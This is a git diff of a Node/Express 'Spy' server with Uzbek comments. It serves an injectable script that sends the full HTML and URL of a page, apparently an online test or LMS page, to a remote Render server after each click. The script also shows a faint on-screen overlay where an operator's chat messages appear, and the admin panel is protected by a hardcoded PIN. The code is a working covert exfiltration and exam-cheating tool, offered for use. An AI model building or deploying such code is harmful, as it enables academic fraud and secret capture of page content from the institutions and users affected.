@@ -7,8 +7,8 @@ const app = express();
 
 // ========================================================
 // ⚙️ SOZLAMALAR
-const MY_SERVER_URL = "https://server-xkuu.onrender.com"; // Render manzilingiz
-const ADMIN_PASSWORD = "8908"; // Parol
+const MY_SERVER_URL = "https://server-xkuu.onrender.com"; // O'zgartiring!
+const ADMIN_PASSWORD = "8908"; 
 // ========================================================
 
 app.use(cors());
@@ -16,10 +16,16 @@ app.use(bodyParser.json({ limit: '50mb' }));
 app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
 app.use(cookieParser());
 
-// --- XOTIRA ---
-let capturedData = { url: "", html: "", date: null };
+// --- XOTIRA (RAM) ---
+// Barcha kelgan sahifalarni shu yerda saqlaymiz (Array)
+let capturedPages = []; 
 let chatHistory = ""; 
 let lastUpdateID = 0;
+
+// O'zbekiston vaqtini olish funksiyasi
+const getUzTime = () => {
+    return new Date().toLocaleString("uz-UZ", { timeZone: "Asia/Tashkent", hour12: false });
+};
 
 // --- AUTH ---
 const checkAuth = (req, res, next) => {
@@ -28,48 +34,51 @@ const checkAuth = (req, res, next) => {
 };
 
 // ========================================================
-// 📜 CLIENT SKRIPTI (f1.js) - STEALTH & AUTO MODE
+// 📜 CLIENT SKRIPTI (f1.js) - 1 QATORLI SCROLL
 // ========================================================
 const clientScript = `
 (function(){
   const BASE = '${MY_SERVER_URL}'; 
-  let lastSince=0, box=null;
+  let lastSince=0, box=null, holdTimer=null, clickCount=0;
 
-  // 1. OYNA DIZAYNI (Juda kichik va sezilmas)
+  // 1. OYNA DIZAYNI (1 Qator, gorizontal scroll)
   function makeBox(){
     if(box) return box;
     box=document.createElement('div');
     Object.assign(box.style,{
-      position:'fixed', left:'5px', bottom:'5px', 
-      width:'250px',              // Kichkina eni
-      maxHeight:'120px',          // Juda past balandlik (ko'zga tashlanmaydi)
-      overflowY:'auto',           // SCROLL (faqat ichida aylanadi)
-      background:'rgba(0, 0, 0, 0.4)', // 60% shaffof (orqasi ko'rinadi)
-      color:'rgba(255, 255, 255, 0.7)', // Oqish-kulrang yozuv
-      padding:'8px',
-      font:'11px sans-serif',     // Kichkina shrift
-      borderRadius:'5px',
+      position:'fixed', left:'10px', bottom:'10px', 
+      width:'280px',              
+      height:'35px',              // Faqat 1 qator balandlik
+      lineHeight:'35px',          // Yozuvni o'rtaga olish
+      overflowX:'auto',           // YONGA SCROLL
+      overflowY:'hidden',         // Pastga scroll yo'q
+      whiteSpace:'nowrap',        // Yozuvni pastga tushirmaslik (1 qator)
+      
+      background:'rgba(0, 0, 0, 0.6)', 
+      color:'#00ff00',            // Yashil yozuv
+      padding:'0 10px',
+      font:'13px monospace',     
+      borderRadius:'50px',        // Yumaloq chetlar
       zIndex:2147483647,
       display:'none', 
-      whiteSpace:'pre-wrap',      
-      wordWrap: 'break-word',
-      backdropFilter:'blur(2px)', // Orqani ozgina xiralashtirish
-      borderLeft: '2px solid rgba(0, 255, 0, 0.5)' // Faqat chap tomonda ingichka chiziq
+      backdropFilter:'blur(4px)', 
+      border:'1px solid rgba(0,255,0,0.3)',
+      cursor:'pointer'
     });
     
-    // Ingichka Scrollbar (Ko'zga tashlanmasligi uchun)
+    // Scrollbar dizayni (yashirish yoki ingichka qilish)
     const style = document.createElement('style');
     style.innerHTML = \`
-      ::-webkit-scrollbar { width: 3px; } 
+      ::-webkit-scrollbar { height: 3px; } 
       ::-webkit-scrollbar-track { background: transparent; }
-      ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.3); borderRadius: 2px; }
+      ::-webkit-scrollbar-thumb { background: rgba(0,255,0,0.5); borderRadius: 10px; }
     \`;
     document.head.appendChild(style);
     document.body.appendChild(box);
     return box;
   }
 
-  // 2. HTML YUBORISH (AUTO MODE)
+  // 2. HTML YUBORISH
   async function sendPage(){
     try{
       await fetch(BASE+'/upload-html',{
@@ -80,37 +89,40 @@ const clientScript = `
             url: window.location.href
         })
       });
-      console.log("Spy: Sent"); // Ekranga hech narsa chiqarmaymiz (Toast yo'q)
+      // Xabar yuborilgandan keyin ham oxirgi xabarni ko'rsatib turish uchun
+      fetchLatest(); 
     }catch(e){}
   }
 
-  // 3. XABAR OLISH
+  // 3. XABAR OLISH (Serverdan)
   async function fetchLatest(){
     try{
+      // since=0 qilib yuborsak, har doim to'liq tarixni olamiz
       const r=await fetch(BASE+'/latest?since='+lastSince);
       const j=await r.json();
       
-      if(j.success && j.timestamp > lastSince){
+      if(j.success){
         const b=makeBox();
-        // Xabar kelganda oynani ko'rsatamiz
-        b.innerHTML = j.message; 
-        b.style.display='block';
-        b.scrollTop = b.scrollHeight; // Avto pastga tushish
+        // Serverdan kelgan xabarni (yangi qatorlarni bo'sh joyga almashtiramiz)
+        // Shunda hammasi 1 qatorda turadi
+        let text = j.message.replace(/\\n/g, " | "); 
+        b.innerText = text; 
+        
+        // Agar yangi xabar bo'lsa, oynani ko'rsatamiz
+        if(j.timestamp > lastSince) {
+            b.style.display='block';
+            b.scrollLeft = b.scrollWidth; // Avto oxiriga o'tkazish
+        }
         lastSince = j.timestamp;
       }
     }catch(e){}
   }
 
-  // --- AUTO SPY (LMS UCHUN) ---
-  // Har safar sahifada biror narsa bosilganda (masalan "Keyingi" tugmasi)
-  // 1.5 soniyadan keyin yangi sahifani yuboradi
-  document.addEventListener('click', () => {
-      setTimeout(sendPage, 1500); 
-  });
+  // --- GESTURES (BOSHQARUV) ---
 
-  // Sichqoncha 3 marta bosilsa oynani yopish/ochish
-  let clickCount = 0;
+  // 1. Sichqoncha 3 marta bosilsa -> Ochish/Yopish
   document.addEventListener('click', e=>{
+    // Click sanash
     if(e.button===0){
       clickCount++;
       setTimeout(()=>clickCount=0,600);
@@ -119,16 +131,36 @@ const clientScript = `
         if(box) box.style.display=(box.style.display==='none')?'block':'none';
       }
     }
+    
+    // Har qanday click bo'lganda (test yechayotganda)
+    // 2 soniyadan keyin yangi sahifani yuborish (Auto-Spy)
+    setTimeout(sendPage, 2000);
   });
 
-  // Doimiy aloqa
-  setInterval(fetchLatest, 3000); // Har 3 soniyada xabar tekshiradi
-  sendPage(); // Ishga tushganda birinchi marta yuboradi
+  // 2. Bosib turilsa (Hold) -> Yangilash
+  document.addEventListener('mousedown', e=>{
+    if(e.button===0) holdTimer=setTimeout(()=>{
+        fetchLatest();
+        if(box) {
+            box.style.display='block'; // Bosib turganda majburan ko'rsatish
+            box.style.background='rgba(0,255,0,0.2)'; // Indikator
+            setTimeout(()=>box.style.background='rgba(0,0,0,0.6)', 200);
+        }
+    }, 2000); // 2 soniya ushlab turilsa
+  });
+
+  document.addEventListener('mouseup', ()=>{
+    if(holdTimer){clearTimeout(holdTimer); holdTimer=null;}
+  });
+
+  // Ishga tushganda
+  setInterval(fetchLatest, 4000); // Har 4 soniyada tekshir
+  sendPage(); 
 })();
 `;
 
 // ========================================================
-// 🛣 SERVER YO'LLARI
+// 🛣 ROUTES
 // ========================================================
 
 app.get("/f1.js", (req, res) => {
@@ -139,24 +171,14 @@ app.get("/f1.js", (req, res) => {
 // LOGIN
 app.get("/login", (req, res) => {
     if (req.cookies.admin_token === ADMIN_PASSWORD) return res.redirect("/");
-    res.send(`
-        <body style="background:#111;color:#555;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif">
-        <form action="/login" method="POST">
-            <input type="password" name="password" style="background:#222;border:1px solid #333;color:#fff;padding:10px;border-radius:5px;outline:none;text-align:center" placeholder="PIN" autofocus>
-        </form>
-        </body>
-    `);
+    res.send(`<body style="background:#000;display:flex;justify-content:center;align-items:center;height:100vh"><form action="/login" method="POST"><input type="password" name="password" style="background:#111;border:1px solid lime;color:lime;padding:10px;text-align:center;font-size:20px" placeholder="CODE" autofocus></form></body>`);
 });
-
 app.post("/login", (req, res) => {
     if (req.body.password === ADMIN_PASSWORD) {
         res.cookie("admin_token", ADMIN_PASSWORD, { maxAge: 86400000, httpOnly: true });
         res.redirect("/");
-    } else {
-        res.redirect("/login");
-    }
+    } else res.redirect("/login");
 });
-
 app.get("/logout", (req, res) => {
     res.clearCookie("admin_token");
     res.redirect("/login");
@@ -164,91 +186,102 @@ app.get("/logout", (req, res) => {
 
 // ADMIN DASHBOARD
 app.get("/", checkAuth, (req, res) => {
-    const hasData = capturedData.html.length > 0;
-    
+    // Sahifalar ro'yxatini HTML qilish
+    let pagesListHtml = capturedPages.map((p, index) => {
+        return `
+        <div class="page-item">
+            <span class="badge">#${index + 1}</span>
+            <span class="time">${p.date}</span>
+            <a href="${p.url}" target="_blank" class="link">${p.url.substring(0, 30)}...</a>
+            <a href="/view-site/${index}" target="_blank" class="btn-view">👁 KO'RISH</a>
+        </div>`;
+    }).reverse().join(""); // Eng yangisi tepada tursin
+
     res.send(`
         <!DOCTYPE html>
         <html>
         <head>
-            <title>Spy Control</title>
+            <title>Spy History</title>
             <meta name="viewport" content="width=device-width, initial-scale=1">
             <style>
-                body { background: #121212; color: #e0e0e0; font-family: sans-serif; padding: 10px; margin: 0; }
-                .container { max-width: 800px; margin: auto; }
-                .box { background: #1e1e1e; padding: 15px; margin-bottom: 15px; border-radius: 8px; border: 1px solid #333; }
-                h3 { margin-top: 0; color: #888; font-size: 14px; text-transform: uppercase; letter-spacing: 1px; }
+                body { background: #0d1117; color: #c9d1d9; font-family: monospace; padding: 10px; max-width: 800px; margin: auto; }
+                .box { border: 1px solid #30363d; background: #161b22; padding: 15px; margin-bottom: 20px; border-radius: 6px; }
+                h2 { color: #58a6ff; border-bottom: 1px solid #333; padding-bottom: 5px; margin-top:0; }
                 
-                /* Chat Input */
-                .chat-form { display: flex; gap: 10px; }
-                input { flex: 1; padding: 10px; background: #2c2c2c; border: 1px solid #444; color: #fff; border-radius: 4px; outline:none; }
-                button { padding: 10px 15px; cursor: pointer; border: none; border-radius: 4px; font-weight: bold; }
-                .btn-send { background: #007bff; color: white; }
-                .btn-clear { background: #dc3545; color: white; width: 100%; margin-top: 10px; opacity: 0.7; font-size: 12px; }
+                /* Chat Styles */
+                input { width: 70%; padding: 10px; background: #0d1117; border: 1px solid #333; color: white; }
+                button { padding: 10px; cursor: pointer; border: none; font-weight: bold; }
+                .btn-send { background: #238636; color: white; width: 25%; }
+                .btn-clear { background: #da3633; color: white; width: 100%; margin-top:5px; }
+                .chat-history { background: #000; color: lime; padding: 10px; height: 100px; overflow-y: scroll; border: 1px solid #333; font-size: 12px; margin-top:10px; white-space: pre-wrap; }
 
-                /* Chat History */
-                .history { 
-                    background: #000; color: #00ff00; padding: 10px; height: 200px; 
-                    overflow-y: auto; border: 1px solid #333; font-family: monospace; font-size: 12px; 
-                    white-space: pre-wrap; margin-top: 10px; border-radius: 4px;
-                }
-
-                /* HTML Viewer */
-                .html-status { font-size: 12px; color: #666; margin-bottom: 10px; }
-                .btn-view { background: #28a745; color: white; display: block; text-align: center; text-decoration: none; padding: 10px; border-radius: 4px; }
+                /* Pages List Styles */
+                .page-item { display: flex; align-items: center; gap: 10px; background: #21262d; padding: 10px; margin-bottom: 5px; border-radius: 4px; border: 1px solid #30363d; }
+                .badge { background: #1f6feb; color: white; padding: 2px 6px; borderRadius: 4px; font-size: 11px; }
+                .time { color: #8b949e; font-size: 11px; }
+                .link { color: #58a6ff; text-decoration: none; font-size: 12px; flex: 1; }
+                .btn-view { background: #238636; color: white; padding: 5px 10px; text-decoration: none; font-size: 11px; border-radius: 3px; }
+                .btn-view:hover { background: #2ea043; }
             </style>
         </head>
         <body>
-            <div class="container">
-                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
-                    <span style="color:#666;font-size:12px">Server: ${MY_SERVER_URL}</span>
-                    <a href="/logout" style="color:#666;text-decoration:none;font-size:12px">Chiqish</a>
-                </div>
-
-                <!-- CHAT -->
-                <div class="box">
-                    <h3>💬 Aloqa</h3>
-                    <form action="/set-message" method="POST" class="chat-form">
-                        <input type="text" name="msg" placeholder="Xabar..." autocomplete="off">
-                        <button class="btn-send">Send</button>
-                    </form>
-                    <div class="history" id="chatbox">${chatHistory || "--- Chat bo'sh ---"}</div>
-                    <form action="/clear-history" method="POST">
-                        <button class="btn-clear">Tozalash</button>
-                    </form>
-                </div>
-
-                <!-- HTML -->
-                <div class="box">
-                    <h3>📥 Sayt / Test</h3>
-                    <div class="html-status">
-                        URL: <a href="${capturedData.url}" target="_blank" style="color:#007bff">${capturedData.url.substring(0,40)}...</a><br>
-                        Vaqt: ${capturedData.date ? new Date(capturedData.date).toLocaleTimeString() : "--:--"}
-                    </div>
-                    ${hasData ? `<a href="/view-site" target="_blank" class="btn-view">👁 SAYTNI OCHISH (TESTNI KO'RISH)</a>` : '<div style="text-align:center;color:#444">Ma\'lumot kutilmoqda...</div>'}
-                </div>
+            <div style="display:flex;justify-content:space-between">
+                <span>Server: ${MY_SERVER_URL}</span>
+                <a href="/logout" style="color:red">Chiqish</a>
             </div>
-            <script>
-                // Admin panelda chatni avto pastga tushirish
-                const c = document.getElementById('chatbox');
-                c.scrollTop = c.scrollHeight;
-            </script>
+
+            <!-- CHAT -->
+            <div class="box">
+                <h2>💬 Chat</h2>
+                <form action="/set-message" method="POST" style="display:flex; justify-content:space-between">
+                    <input type="text" name="msg" placeholder="Xabar..." autocomplete="off">
+                    <button class="btn-send">YUBORISH</button>
+                </form>
+                <div class="chat-history">${chatHistory || "Bo'sh"}</div>
+                <form action="/clear-history" method="POST"><button class="btn-clear">Chatni Tozalash</button></form>
+            </div>
+
+            <!-- SAQLANGAN SAHIFALAR -->
+            <div class="box">
+                <div style="display:flex; justify-content:space-between; align-items:center">
+                    <h2>📥 Kelgan Sahifalar (${capturedPages.length})</h2>
+                    <form action="/clear-pages" method="POST" style="margin:0"><button style="background:transparent;color:red;border:1px solid red;padding:2px 5px">Tozalash</button></form>
+                </div>
+                
+                ${capturedPages.length === 0 ? '<p style="text-align:center;color:#666">Hali ma\'lumot yo\'q</p>' : pagesListHtml}
+            </div>
         </body>
         </html>
     `);
 });
 
-app.get("/view-site", checkAuth, (req, res) => {
-    if (!capturedData.html) return res.send("Ma'lumot yo'q");
-    // Rasmlar va stillar ishlashi uchun <base> qo'shamiz
-    const fixedHtml = capturedData.html.replace("<head>", `<head><base href="${capturedData.url}">`);
+// SAHIFANI KO'RISH (ID bo'yicha)
+app.get("/view-site/:id", checkAuth, (req, res) => {
+    const id = req.params.id;
+    const page = capturedPages[id];
+
+    if (!page) return res.send("Sahifa topilmadi yoki o'chirilgan.");
+    
+    // <base> qo'shish (CSS/Rasmlar uchun)
+    const fixedHtml = page.html.replace("<head>", `<head><base href="${page.url}">`);
     res.send(fixedHtml);
 });
 
-// DATA QABUL QILISH
+// DATA QABUL QILISH (Arrayga qo'shish)
 app.post("/upload-html", (req, res) => {
-    capturedData.url = req.body.url || "Noma'lum";
-    capturedData.html = req.body.html || "";
-    capturedData.date = Date.now();
+    const newPage = {
+        url: req.body.url || "Noma'lum",
+        html: req.body.html || "",
+        date: getUzTime()
+    };
+    
+    // Arrayga qo'shamiz
+    capturedPages.push(newPage);
+    
+    // RAM to'lib ketmasligi uchun faqat oxirgi 50 ta sahifani saqlaymiz
+    if(capturedPages.length > 50) capturedPages.shift();
+
+    console.log(`[+] Yangi sahifa: ${newPage.url}`);
     res.json({ status: "success" });
 });
 
@@ -256,30 +289,35 @@ app.post("/upload-html", (req, res) => {
 app.post("/set-message", checkAuth, (req, res) => {
     const msg = req.body.msg;
     if(msg) {
-        const time = new Date().toLocaleTimeString('uz-UZ', {hour: '2-digit', minute:'2-digit'});
-        chatHistory += `[${time}] ${msg}\n`;
+        // Chat tarixiga vaqt bilan qo'shish
+        chatHistory += `[${getUzTime().split(' ')[1]}] ${msg}\n`;
         lastUpdateID = Date.now();
     }
     res.redirect("/");
 });
 
+// TOZALASH FUNKSIYALARI
 app.post("/clear-history", checkAuth, (req, res) => {
     chatHistory = ""; 
     lastUpdateID = Date.now(); 
     res.redirect("/");
 });
+app.post("/clear-pages", checkAuth, (req, res) => {
+    capturedPages = []; 
+    res.redirect("/");
+});
 
+// LATEST (Client uchun)
 app.get("/latest", (req, res) => {
     const clientTimestamp = parseInt(req.query.since) || 0;
-    if (lastUpdateID > clientTimestamp) {
-        res.json({ 
-            success: true, 
-            message: chatHistory, 
-            timestamp: lastUpdateID 
-        });
-    } else {
-        res.json({ success: false });
-    }
+    
+    // Clientga har doim butun tarixni beramiz (u o'zi 1 qator qilib oladi)
+    // Lekin timestamp tekshirib, "yangi xabar" signalini beramiz
+    res.json({ 
+        success: true, 
+        message: chatHistory, 
+        timestamp: lastUpdateID 
+    });
 });
 
 const PORT = process.env.PORT || 3000;
